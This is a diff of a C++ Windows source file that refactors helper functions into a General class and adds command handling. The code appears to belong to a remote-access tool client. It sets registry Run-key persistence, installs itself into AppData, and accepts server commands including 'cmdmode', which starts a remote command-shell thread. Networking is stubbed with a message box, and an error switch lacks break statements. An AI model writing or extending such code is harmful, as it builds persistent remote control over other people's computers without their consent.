@@ -1,16 +1,9 @@
-#include <Windows.h>
-#include <string>
-#include <tchar.h>
-#include <stdio.h>
-
 #include "general.h"
 
-using namespace std;
 
 
 
-
-bool regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName)
+bool General::regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName)
 {
 	DWORD dwType = 0;
 	long lResult = 0;
@@ -32,7 +25,7 @@ bool regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName)
 		return false;
 }
 
-bool setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
+bool General::setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
 {
 	HKEY hKey = NULL;
 	LONG lResult = 0;
@@ -75,7 +68,7 @@ bool setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
 }
 
 
-bool directoryExists(const char* dirName)			//checks if directory exists
+bool General::directoryExists(const char* dirName)			//checks if directory exists
 {
 	DWORD attribs = ::GetFileAttributesA(dirName);
 	if (attribs == INVALID_FILE_ATTRIBUTES)
@@ -83,7 +76,7 @@ bool directoryExists(const char* dirName)			//checks if directory exists
 	return true;			//original code : return (attribs & FILE_ATTRIBUTE_DIRECTORY); [CHANGED BC WARNING]
 }
 
-void startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments)		//starts a process
+void General::startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments)		//starts a process
 {
 	// additional information
 	STARTUPINFO si;
@@ -109,36 +102,95 @@ void startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments)		//starts a pro
 	CloseHandle(pi.hThread);
 }
 
-string getInstallFolder()		//gets install folder (example: C:\users\USER\AppData\Roaming\InstallDIR)
+std::string General::getInstallFolder()		//gets install folder (example: C:\users\USER\AppData\Roaming\InstallDIR)
 {
-	string rest = "";
-	if (!(folderName == ""))
-		rest = "\\" + folderName;
+	std::string rest = "";
+	if (!(Settings::folderName == ""))
+		rest = "\\" + Settings::folderName;
 
-	string concat;
+	std::string concat;
 	char* buf = 0;
 	size_t sz = 0;
-	if (_dupenv_s(&buf, &sz, installLocation.c_str()) == 0) //gets environment variable
+	if (_dupenv_s(&buf, &sz, Settings::installLocation.c_str()) == 0) //gets environment variable
 		if (buf != NULL)
 		{
 
-			concat = string(buf) + rest; //concatenates string
+			concat = std::string(buf) + rest; //concatenates string
 			free(buf);
 		}
 	return concat;
 }
 
-string getInstallPath(string instFolder)		//gets installpath (environment folder + folder name (if supplied) + file name)
+std::string General::getInstallPath(std::string instFolder)		//gets installpath (environment folder + folder name (if supplied) + file name)
 {
-	string concat;
-	concat = instFolder + "\\" + fileName;
+	std::string concat;
+	concat = instFolder + "\\" + Settings::fileName;
 
 	return concat;
 }
 
-string getCurrentPath()		//gets current path of executable
+std::string General::getCurrentPath()		//gets current path of executable
 {
 	char buf[MAX_PATH];
 	GetModuleFileName(0, buf, MAX_PATH);
-	return string(buf);
+	return std::string(buf);
+}
+
+
+void General::handleError(int errType, bool errSevere)	//handles errors
+{
+	if (errSevere)
+	{
+			//restart client
+	}
+	else
+	{
+		switch (errType)
+		{
+		case 1:		//general error
+			sendError("General error");
+		case 2:		//cmd error		
+			sendError("CMD error");
+		case 3:		//networking error
+			sendError("Networking error");
+		}
+	}
+
+}
+
+void General::sendError(std::string errorMessage)	//send error message to server
+{
+	MessageBox(NULL, errorMessage.c_str(), "sendError replacement", NULL);
+}
+
+void General::processCommand(std::string command)
+{
+	if (command == "kill")
+	{
+
+	}
+	else if (command == "restart")
+	{
+
+	}
+	else if (command == "cmdmode")
+	{
+		if (!CMD::cmdOpen)
+		{
+			CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CMD::cmdThread, NULL, NULL, NULL);
+			while (!CMD::cmdOpen)
+			{
+				Sleep(50);
+			}
+		}
+		else
+		{
+			CMD::cmdptr->writeCMD("exit");
+			CMD::cmdOpen = false;
+		}
+	}
+	else
+	{
+		sendError("Command '" + command + "' was not recognized.");
+	}
 }
